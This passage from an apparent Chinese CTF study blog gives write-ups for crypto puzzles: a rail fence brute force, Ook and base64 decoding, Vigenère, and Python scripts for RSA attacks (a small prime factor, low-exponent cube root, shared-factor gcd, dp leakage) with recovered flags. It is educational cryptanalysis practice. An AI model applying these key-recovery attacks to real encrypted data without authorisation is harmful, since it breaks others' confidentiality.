n</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">maxData = <span class="number">10000</span></span><br><span class="line"><span class="comment">#小于maxData的所有素数</span></span><br><span class="line">primes = [ p <span class="keyword">for</span> p <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, maxData) <span class="keyword">if</span> <span class="number">0</span> <span class="keyword">not</span> <span class="keyword">in</span></span><br><span class="line">        [ p% d <span class="keyword">for</span> d <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="built_in">int</span>(sqrt(p))+<span class="number">1</span>)] ]</span><br><span class="line"></span><br><span class="line">whu = []</span><br><span class="line">m = <span class="built_in">input</span>(<span class="string">&quot;请输入传统栅栏密文：&quot;</span>)</span><br><span class="line"></span><br><span class="line">len_m = <span class="built_in">len</span>(m)</span><br><span class="line"><span class="built_in">print</span>(len_m, <span class="string">&#x27;=&#x27;</span>, factoring(len_m))</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, len_m):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;每组字母数：&#x27;</span>, each)</span><br><span class="line">        enFence(m, <span class="built_in">int</span>(each))</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;错误!&#x27;</span>, <span class="string">&#x27;输入密文位数为&#x27;</span>, len_m)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> each <span class="keyword">in</span> whu:</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> each:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;\n我觉得flag是这个！你看呢？\n&#123;0&#125;&#x27;</span>.<span class="built_in">format</span>( each))</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">我觉得flag是这个！你看呢？</span></span><br><span class="line"><span class="string">flag&#123;76d6207ceb064719cdf7b8d6168fefda&#125;</span></span><br><span class="line"><span class="string"> &quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><h2 id="Ook·1"><a href="#Ook·1" class="headerlink" title="Ook·1"></a>Ook·1</h2><h2 id="题解-3"><a href="#题解-3" class="headerlink" title="题解"></a>题解</h2><blockquote><p>Ook码在线解码</p></blockquote><h2 id="题目-5"><a href="#题目-5" class="headerlink" title="题目"></a>题目</h2><blockquote></blockquote><h2 id="题解-4"><a href="#题解-4" class="headerlink" title="题解"></a>题解</h2><blockquote><p>祭出<a href="https://gchq.github.io/CyberChef">网络厨子CyberChef</a></p></blockquote><p><img src="https://s2.loli.net/2022/01/01/TL3okyZF2HB9VNX.png" alt="image-20220101004938849"></p><p>接下来，无脑点击结果优化！</p><p><img src="https://s2.loli.net/2022/01/01/g5XrJ8uS2G6kVqt.png" alt="image-20220101005011430"></p><p>结果放进栅栏, 解得:</p><blockquote><p>我觉得flag是这个！你看呢？<br>flag{0939_F2A_BACD0}</p></blockquote><h2 id="easy-base·13"><a href="#easy-base·13" class="headerlink" title="easy_base·13"></a>easy_base·13</h2><h3 id="题目-6"><a href="#题目-6" class="headerlink" title="题目"></a>题目</h3><blockquote><p>“影分身之术*40”<br>下载后，打开看到巨多的base64<br>懒得写代码，厨师👨‍🍳烹饪40次</p></blockquote><p><img src="https://s2.loli.net/2022/01/01/jO1Avo8TkRZ6gIf.png" alt="image-20220101005247078"></p><h2 id="2018-HEBTUCTF-Sudoku-amp-Viginere·39"><a href="#2018-HEBTUCTF-Sudoku-amp-Viginere·39" class="headerlink" title="2018 HEBTUCTF Sudoku&amp;Viginere·39"></a>2018 HEBTUCTF Sudoku&amp;Viginere·39</h2><h2 id="题目-7"><a href="#题目-7" class="headerlink" title="题目"></a>题目</h2><blockquote><p>下载附件，为一个doc文件，打开后发现是一个数独游戏，和一个密码。</p><p><img src="https://img-blog.csdnimg.cn/20201203215415882.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI2MjQzMDQ1,size_16,color_FFFFFF,t_70" alt="img"></p></blockquote><h2 id="题解-5"><a href="#题解-5" class="headerlink" title="题解"></a>题解</h2><p>完成数独后：</p><p><img src="https://img-blog.csdnimg.cn/20201203215415898.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI2MjQzMDQ1,size_16,color_FFFFFF,t_70" alt="img"></p><p>维吉尼亚解码,得到：</p><blockquote><p>HEBTUCTF{15_1t_3a5y}</p></blockquote><h2 id="看键盘·56"><a href="#看键盘·56" class="headerlink" title="看键盘·56"></a>看键盘·56</h2><h3 id="题目-8"><a href="#题目-8" class="headerlink" title="题目"></a>题目</h3><blockquote><p>ujn njkm ijnmhjk fgtrdcv tgvgy njkm hjuygbn ijnmhjk</p><p>提交：ctf{}</p></blockquote><h3 id="题解-6"><a href="#题解-6" class="headerlink" title="题解"></a>题解</h3><p>常规又离谱。</p><p>根据<a href="https://ctf.webvpn.nefu.edu.cn/bbs/d/95-crypto2">古典密码大全(2)</a>,没找到</p><p>于是便仔细看键盘，发现每组连在一起，轨迹像字母</p><h4 id="第一次尝试"><a href="#第一次尝试" class="headerlink" title="第一次尝试"></a>第一次尝试</h4><blockquote><p>i/j/l   n   ?  e   y/v   n    e  ?</p></blockquote><h4 id="第二次尝试"><a href="#第二次尝试" class="headerlink" title="第二次尝试"></a>第二次尝试</h4><blockquote><p>jnteynet</p></blockquote><h4 id="第三次尝试"><a href="#第三次尝试" class="headerlink" title="第三次尝试"></a>第三次尝试</h4><blockquote><p>lnteynet<br>l为L小写</p></blockquote><h4 id="第四次尝试"><a href="#第四次尝试" class="headerlink" title="第四次尝试"></a>第四次尝试</h4><blockquote><p>我一眼就看出是你！互联网<br>ctf{internet}</p><p><strong>错了！</strong></p></blockquote><h4 id="第五次尝试"><a href="#第五次尝试" class="headerlink" title="第五次尝试"></a>第五次尝试</h4><blockquote><p>ctf{Internet}</p><p>意料之外，情理之中</p><p><strong>成了！</strong></p></blockquote><h2 id="2018-AFCTF-可怜的RSA-·-69"><a href="#2018-AFCTF-可怜的RSA-·-69" class="headerlink" title="2018 AFCTF 可怜的RSA · 69"></a>2018 AFCTF 可怜的RSA · 69</h2><h3 id="题目-9"><a href="#题目-9" class="headerlink" title="题目"></a>题目</h3><blockquote><p>flag.pem 和 public key.pem</p></blockquote><h3 id="题解-7"><a href="#题解-7" class="headerlink" title="题解"></a>题解</h3><ul><li><p>改公钥后缀，放入网站解析（其实python本身就可以做到</p></li><li><p>得到n,e 进而得到q、p、phi、d</p></li><li><p>flag改后缀能打开，看到base形式的东西，直接base解码没东西</p><blockquote><p>GVd1d3viIXFfcHapEYuo5fAvIiUS83adrtMW/MgPwxVBSl46joFCQ1plcnlDGfL19K/3PvChV6n5QGohzfVyz2Z5GdTlaknxvHDUGf5HCukokyPwK/1EYU7NzrhGE7J5jPdi0Aj7xi/Odxy0hGMgpaBLd/nL3N8O6i9pc4Gg3O8soOlciBG/6/xdfN3SzSStMYIN8nfZZMSq3xDDvz4YB7TcTBh4ik4wYhuC77gmT+HWOv5gLTNQ3EkZs5N3EAopy11zHNYU80yv1jtFGcluNPyXYttU5qU33jcp0Wuznac+t+AZHeSQy5vk8DyWorSGMiS+J4KNqSVlDs12EqXEqqJ0uA==</p></blockquote></li></ul><h4 id="Punchline"><a href="#Punchline" class="headerlink" title="Punchline"></a>Punchline</h4><p>风二西的课程讲了，这里才看到实际的应用。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">text</span> = &#x27;GVd<span class="number">1</span>d<span class="number">3</span>viIXFfcHapEYuo<span class="number">5</span>fAvIiUS<span class="number">83</span>adrtMW/MgPwxVBSl<span class="number">46</span>joFCQ<span class="number">1</span>plcnlDGfL<span class="number">19</span>K/<span class="number">3</span>PvChV<span class="number">6</span>n<span class="number">5</span>QGohzfVyz<span class="number">2</span>Z<span class="number">5</span>GdTlaknxvHDUGf<span class="number">5</span>HCukokyPwK/<span class="number">1</span>EYU<span class="number">7</span>NzrhGE<span class="number">7</span>J<span class="number">5</span>jPdi<span class="number">0</span>Aj<span class="number">7</span>xi/Odxy<span class="number">0</span>hGMgpaBLd/nL<span class="number">3</span>N<span class="number">8</span>O<span class="number">6</span>i<span class="number">9</span>pc<span class="number">4</span>Gg<span class="number">3</span>O<span class="number">8</span>soOlciBG/<span class="number">6</span>/xdfN<span class="number">3</span>SzSStMYIN<span class="number">8</span>nfZZMSq<span class="number">3</span>xDDvz<span class="number">4</span>YB<span class="number">7</span>TcTBh<span class="number">4</span>ik<span class="number">4</span>wYhuC<span class="number">77</span>gmT+HWOv<span class="number">5</span>gLTNQ<span class="number">3</span>EkZs<span class="number">5</span>N<span class="number">3</span>EAopy<span class="number">11</span>zHNYU<span class="number">80</span>yv<span class="number">1</span>jtFGcluNPyXYttU<span class="number">5</span>qU<span class="number">33</span>jcp<span class="number">0</span>Wuznac+t+AZHeSQy<span class="number">5</span>vk<span class="number">8</span>DyWorSGMiS+J<span class="number">4</span>KNqSVlDs<span class="number">12</span>EqXEqqJ<span class="number">0</span>uA==&#x27;</span><br><span class="line"><span class="attribute">c_bytes</span> =base<span class="number">64</span>.b<span class="number">64</span>decode(text)</span><br><span class="line"><span class="attribute">rsa_components</span>=(n,e,int(d),p,q)</span><br><span class="line"><span class="attribute">arsa</span>=RSA.construct(rsa_components)</span><br><span class="line"><span class="attribute">rsakey</span> = RSA.importKey(arsa.exportKey())</span><br><span class="line"><span class="attribute">rsakey</span> = PKCS<span class="number">1</span>_OAEP.new(rsakey)</span><br><span class="line"><span class="attribute">decrypted</span> = rsakey.decrypt(c_bytes)</span><br><span class="line"><span class="attribute">print</span>(decrypted)</span><br></pre></td></tr></table></figure><h3 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># flag 文件 改txt后base码</span></span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"> </span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> PKCS1_OAEP</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">p = <span class="number">3133337</span></span><br><span class="line">q = <span class="number">25478326064937419292200172136399497719081842914528228316455906211693118321971399936004729134841162974144246271486439695786036588117424611881955950996219646807378822278285638261582099108339438949573034101215141156156408742843820048066830863814362379885720395082318462850002901605689761876319151147352730090957556940842144299887394678743607766937828094478336401159449035878306853716216548374273462386508307367713112073004011383418967894930554067582453248981022011922883374442736848045920676341361871231787163441467533076890081721882179369168787287724769642665399992556052144845878600126283968890273067575342061776244939</span></span><br><span class="line">b = (p-<span class="number">1</span>) * (q-<span class="number">1</span>)</span><br><span class="line">n = p*q</span><br><span class="line">d = gmpy2.invert(e, b)</span><br><span class="line"></span><br><span class="line">text = <span class="string">&#x27;GVd1d3viIXFfcHapEYuo5fAvIiUS83adrtMW/MgPwxVBSl46joFCQ1plcnlDGfL19K/3PvChV6n5QGohzfVyz2Z5GdTlaknxvHDUGf5HCukokyPwK/1EYU7NzrhGE7J5jPdi0Aj7xi/Odxy0hGMgpaBLd/nL3N8O6i9pc4Gg3O8soOlciBG/6/xdfN3SzSStMYIN8nfZZMSq3xDDvz4YB7TcTBh4ik4wYhuC77gmT+HWOv5gLTNQ3EkZs5N3EAopy11zHNYU80yv1jtFGcluNPyXYttU5qU33jcp0Wuznac+t+AZHeSQy5vk8DyWorSGMiS+J4KNqSVlDs12EqXEqqJ0uA==&#x27;</span></span><br><span class="line">c_bytes =base64.b64decode(text)</span><br><span class="line">rsa_components=(n,e,<span class="built_in">int</span>(d),p,q)</span><br><span class="line">arsa=RSA.construct(rsa_components)</span><br><span class="line">rsakey = RSA.importKey(arsa.exportKey())</span><br><span class="line">rsakey = PKCS1_OAEP.new(rsakey)</span><br><span class="line">decrypted = rsakey.decrypt(c_bytes)</span><br><span class="line"><span class="built_in">print</span>(decrypted)</span><br></pre></td></tr></table></figure><h2 id="small-rsa·72"><a href="#small-rsa·72" class="headerlink" title="small_rsa·72"></a>small_rsa·72</h2><h3 id="题目-10"><a href="#题目-10" class="headerlink" title="题目"></a>题目</h3><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># -*- coding: utf-8 -*-</span></span><br><span class="line">from Crypto.PublicKey import RSA</span><br><span class="line">import libnum</span><br><span class="line">import uuid</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;flag&#123;***************&#125;&quot;</span></span><br><span class="line">rsa = RSA.generate(<span class="number">4096</span>,e=<span class="number">3</span>)</span><br><span class="line">p = rsa.p</span><br><span class="line">d = rsa.d</span><br><span class="line">e = rsa.e</span><br><span class="line">N = rsa.n</span><br><span class="line">m = libnum.s2n(flag)</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, N)</span><br><span class="line">print <span class="string">&quot;[+]c:&quot;</span>,c</span><br><span class="line">print <span class="string">&quot;[+]N:&quot;</span>,N</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">[+]c: <span class="number">34424678424825</span><span class="number">61323703237574</span><span class="number">53790755403533</span><span class="number">76227629711032</span><span class="number">10557480050349</span><span class="number">35987304162433</span><span class="number">62617827315090</span><span class="number">68910003360547</span><span class="number">04994248241503</span><span class="number">68629048446004</span><span class="number">84976674423604</span><span class="number">86171016603355</span><span class="number">85769214380685</span><span class="number">55951948966099</span><span class="number">65890260672529</span><span class="number">25519523451931</span><span class="number">32973996288566</span><span class="number">24613870875481</span><span class="number">05116468113620</span><span class="number">17769063041425</span><span class="number">11571230562974</span><span class="number">83412077923056</span><span class="number">94590742066971</span><span class="number">20252340530156</span><span class="number">12333419910373</span><span class="number">74101265623265</span><span class="number">33207078744933</span><span class="number">29917920970900</span><span class="number">44761973705909</span><span class="number">21713711964909</span><span class="number">13134572065898</span><span class="number">03479797894924</span><span class="number">40201727354371</span><span class="number">99248495920703</span><span class="number">28396276760381</span><span class="number">50161293403965</span>3</span><br><span class="line">[+]N: <span class="number">69131667710943</span><span class="number">66231134224937</span><span class="number">82665795857921</span><span class="number">91789375994212</span><span class="number">30874628798840</span><span class="number">62720557906429</span><span class="number">18315585959775</span><span class="number">68908961920440</span><span class="number">03240821906332</span><span class="number">57529247616007</span><span class="number">20395057717945</span><span class="number">31255542244123</span><span class="number">51692967127730</span><span class="number">63614670745457</span><span class="number">20823735806308</span><span class="number">00309198342767</span><span class="number">83002877094695</span><span class="number">82282466572230</span><span class="number">06658019522727</span><span class="number">82147762802137</span><span class="number">22215953097747</span><span class="number">45343728973446</span><span class="number">94547124261079</span><span class="number">67188109548966</span><span class="number">90723787784031</span><span class="number">60098284762003</span><span class="number">88327329144783</span><span class="number">87703349123870</span><span class="number">99544738099911</span><span class="number">52727333616022</span><span class="number">40651744313054</span><span class="number">27131672064217</span><span class="number">87038596312975</span><span class="number">15316584862572</span><span class="number">19110805612426</span><span class="number">46092299016802</span><span class="number">66291301707168</span><span class="number">57405486991638</span><span class="number">36007474224715</span><span class="number">42658760954937</span><span class="number">22891819778300</span><span class="number">92677128368806</span><span class="number">11313145983118</span><span class="number">23905209428926</span><span class="number">70696447128631</span><span class="number">48560657994388</span><span class="number">58122606408057</span><span class="number">56035377584155</span><span class="number">13577015591578</span><span class="number">21200251164860</span><span class="number">61540105139339</span><span class="number">65572290472129</span><span class="number">46291490250330</span><span class="number">66823599823964</span><span class="number">44462077925910</span><span class="number">61769134788393</span><span class="number">70100891213072</span><span class="number">10006310123263</span><span class="number">51836365523609</span><span class="number">52762838656307</span><span class="number">30062119524805</span><span class="number">92536147451188</span><span class="number">52163569388418</span><span class="number">08629174880510</span><span class="number">01750086583878</span><span class="number">03878200034840</span><span class="number">21550651671564</span><span class="number">06211656616421</span><span class="number">77371863874586</span><span class="number">06952402225864</span><span class="number">29151006155960</span><span class="number">32443145034847</span><span class="number">03156435667155</span><span class="number">91792127054661</span><span class="number">45609698475546</span><span class="number">21099474894912</span><span class="number">13598530942479</span><span class="number">90533075004393</span><span class="number">53456542177646</span><span class="number">87858212612913</span><span class="number">09463205314057</span><span class="number">88201626606636</span><span class="number">56360180844991</span><span class="number">58806717036972</span><span class="number">59084845889101</span><span class="number">91715832689201</span><span class="number">80691221168453</span><span class="number">61202969851027</span>1</span><br><span class="line">&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure><h3 id="题解-8"><a href="#题解-8" class="headerlink" title="题解"></a>题解</h3><p>我一眼就看出来，你的e才等于3.<br>了解到低加密指数攻击</p><h4 id="代码-4"><a href="#代码-4" class="headerlink" title="代码"></a>代码</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">a,b = gmpy2.iroot(mm, e)</span></span><br><span class="line"><span class="string">a 为 mm开e次方的结果，b为是否刚好开得出来（True/False）</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">de</span>(<span class="params">c, e, n</span>):</span></span><br><span class="line">    k = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        mm = c + n*k</span><br><span class="line">        result, flag = gmpy2.iroot(mm, e)</span><br><span class="line">        <span class="keyword">if</span> <span class="literal">True</span> == flag:</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">        k += <span class="number">1</span></span><br><span class="line">n= <span class="number">691316677109436623113422493782665795857921917893759942123087462879884062720557906429183155859597756890896192044003240821906332575292476160072039505771794531255542244123516929671277306361467074545720823735806308003091983427678300287709469582282466572230066580195227278214776280213722215953097747453437289734469454712426107967188109548966907237877840316009828476200388327329144783877033491238709954473809991152727333616022406517443130542713167206421787038596312975153165848625721911080561242646092299016802662913017071685740548699163836007474224715426587609549372289181977830092677128368806113131459831182390520942892670696447128631485606579943885812260640805756035377584155135770155915782120025116486061540105139339655722904721294629149025033066823599823964444620779259106176913478839370100891213072100063101232635183636552360952762838656307300621195248059253614745118852163569388418086291748805100175008658387803878200034840215506516715640621165661642177371863874586069524022258642915100615596032443145034847031564356671559179212705466145609698475546210994748949121359853094247990533075004393534565421776468785821261291309463205314057882016266066365636018084499158806717036972590848458891019171583268920180691221168453612029698510271</span></span><br><span class="line">e= <span class="number">3</span></span><br><span class="line">c= <span class="number">3442467842482561323703237574537907554035337622762971103210557480050349359873041624336261782731509068910003360547049942482415036862904844600484976674423604861710166033558576921438068555951948966099658902606725292551952345193132973996288566246138708754810511646811362017769063041425115712305629748341207792305694590742066971202523405301561233341991037374101265623265332070787449332991792097090044761973705909217137119649091313457206589803479797894924402017273543719924849592070328396276760381501612934039653</span></span><br><span class="line"></span><br><span class="line">m=de(c,e,n)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(m)).decode())</span><br></pre></td></tr></table></figure><p>以上为凌晨时分的题解。</p><p><strong>今天主要在打BMZCTF赛事，虽然没出什么成绩但收获不小</strong>。</p><h1 id="1-2"><a href="#1-2" class="headerlink" title="1.2"></a>1.2</h1><h2 id="中国剩余定理及部分裴蜀定理证明-1"><a href="#中国剩余定理及部分裴蜀定理证明-1" class="headerlink" title="中国剩余定理及部分裴蜀定理证明"></a>中国剩余定理及部分裴蜀定理证明</h2><blockquote><p><a href="https://www.bilibili.com/video/BV1gf4y1S7LR?from=search&seid=2828626318515218364&spm_id_from=333.337.0.0">中国剩余定理课程</a></p></blockquote><h3 id="原理证明-3"><a href="#原理证明-3" class="headerlink" title="原理证明"></a>原理证明</h3><p><img src="https://s2.loli.net/2022/01/02/8vZekY9qczBtNSV.png" alt="image-20220102182601081"></p><p><img src="https://s2.loli.net/2022/01/02/HIMKvG1OD9PRij6.png" alt="image-20220102182611017"></p><p><img src="https://s2.loli.net/2022/01/02/1zVmRjNKCBfJseu.png" alt="image-20220102182621455"></p><p><img src="https://s2.loli.net/2022/01/02/mcSvZzo8OiWu1K2.png" alt="image-20220102182634428"></p><h3 id="实际应用-1"><a href="#实际应用-1" class="headerlink" title="实际应用"></a>实际应用</h3><p><img src="https://s2.loli.net/2022/01/04/AJ4xRwIvtnSD9jB.png" alt="image-20220104160301773"></p><h1 id="1-3-1-4"><a href="#1-3-1-4" class="headerlink" title="1.3/1.4"></a>1.3/1.4</h1><h2 id="RSA·N不素"><a href="#RSA·N不素" class="headerlink" title="RSA·N不素"></a>RSA·N不素</h2><blockquote><p>特征是，生成多个N的时候，用了同一个素数p/q</p></blockquote><h3 id="对策"><a href="#对策" class="headerlink" title="对策"></a>对策</h3><p>求两个的N之间的公约数p。</p><h4 id="代码-5"><a href="#代码-5" class="headerlink" title="代码"></a>代码</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">e= <span class="number">65537</span></span><br><span class="line">n1= <span class="number">18851781425565649500243914718895527060598553785142033499277947796047289729069551538151421839511239897691881228121437622923274745439286192958624933347473814433650645821240330239352230328910532686189064529002598986350545013596873280380093139589440286483854335646063005690269032198568724965964443111093291700142910652223408636268615176273268372177721667944316123253596652992256076572634227395015036348109972259736684061785035583511127926569341967394058493301139935304361924639075754092181040235419401702148068770694697982444290753353433701503833775179671108406498799549700127209151389161427718168658930877516526900193773</span></span><br><span class="line">n2= <span class="number">24141384186719901100738328229558939321137195844627407412035205930880546126459260897433418685279927024995699136588216700770429628894224051287181657357533218989737870319139269421990248988961435374202640406264110282763206906390508271179764960952342404379846442988489435158217691170804372863828966379599925114485971708200189788312061335938149982724447336254731731196164294152411281627551943972751739099703406466680639123738668207648503911709799873188331259979032169198913999856215096219340617703116234922400948884716827963616800355410477122406692338452507358998811789750057925245184372948089354754021196407808558611706347</span></span><br><span class="line">c1= <span class="number">11233930138929485738604185458820792679941706517184575056860307907280050814616639358486313129298273947905894904145194035804995663173314907762677924041275132974029028894644172713486633713023630611556983846927634063704894533048653309657581762974450289360550659261899944333557732087882069544235529266455787027619668939220511057340231613645208599303911724024926701608537602920797245075262273603379467945283128416767718651714209330369788240996832207630345743245279821753430782200336283582459635492184924556145031704499178500242816865275291936063430100028447772122941596704727728675661250380470986371668037469383671505328135</span></span><br><span class="line">c2= <span class="number">5585224206647236865248808202221713289466135149339680308821203835812670001259895780508640505222648200259525489427033258746992319005320440650548405653844536422632581252608192223771882550003217335273112474383014796651892287737753603533030776710121680439078567046997872719450037145665867123925472406058893384600128119493338790196284996386511009366274826447064392594100457497289556291407982935292829015102796178711091471748295065093460144885719356062242014650190112796869173536886083200906303200902844575328314123662659807283984619970501020349836850699532193026247740142876327310689901499496665093919484517214474842110431</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#求最大公约数</span></span><br><span class="line">q=gmpy2.gcd(n1,n2)</span><br><span class="line">p1=n1//q</span><br><span class="line"></span><br><span class="line">phi_n=(q-<span class="number">1</span>)*(p1-<span class="number">1</span>)</span><br><span class="line"><span class="comment">#求逆元d</span></span><br><span class="line">d1=libnum.invmod(e,phi_n)</span><br><span class="line">m=<span class="built_in">pow</span>(c1,d1,n1)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="comment">#数字转字节，转字符串</span></span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(m)).decode())</span><br></pre></td></tr></table></figure><h2 id="RSA·dp泄漏"><a href="#RSA·dp泄漏" class="headerlink" title="RSA·dp泄漏"></a>RSA·dp泄漏</h2><h3 id="什么是dp"><a href="#什么是dp" class="headerlink" title="什么是dp"></a>什么是dp</h3><p>$$ dp  = d mod (p-1) $$</p><h3 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h3><p><img src="https://s2.loli.net/2022/01/04/OcpYr7Jdj1NBQ4l.png" alt="image-20220104031451084"></p><h3 id="代码实现-1"><a href="#代码实现-1" class="headerlink" title="代码实现"></a>代码实现</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2 <span class="keyword">as</span> gp</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = <span class="number">156808343598578774957375696815188980682166740609302831099696492068246337198792510898818496239166339015207305102101431634283168544492984586566799996471150252382144148257236707247267506165670877506370253127695314163987084076462560095456635833650720606337852199362362120808707925913897956527780930423574343287847</span></span><br><span class="line">c = <span class="number">108542078809057774666748066235473292495343753790443966020636060807418393737258696352569345621488958094856305865603100885838672591764072157183336139243588435583104423268921439473113244493821692560960443688048994557463526099985303667243623711454841573922233051289561865599722004107134302070301237345400354257869</span></span><br><span class="line">dp = <span class="number">734763139918837027274765680404546851353356952885439663987181004382601658386317353877499122276686150509151221546249750373865024485652349719427182780275825</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, e+<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">if</span> (dp*e-<span class="number">1</span>) % a == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> n % ((dp*e-<span class="number">1</span>) // a + <span class="number">1</span>) == <span class="number">0</span>:  <span class="comment"># ! 关键，易漏.要求n被p整除</span></span><br><span class="line">            p = (dp*e-<span class="number">1</span>) // a + <span class="number">1</span></span><br><span class="line">            q = n // p</span><br><span class="line">            phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">            d = gp.invert(e, phi)</span><br><span class="line">            m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">            <span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        a += <span class="number">1</span></span><br></pre></td></tr></table></figure><h2 id="2018-AFCTF-BASE-·-100"><a href="#2018-AFCTF-BASE-·-100" class="headerlink" title="2018 AFCTF BASE · 100"></a>2018 AFCTF BASE · 100</h2><h3 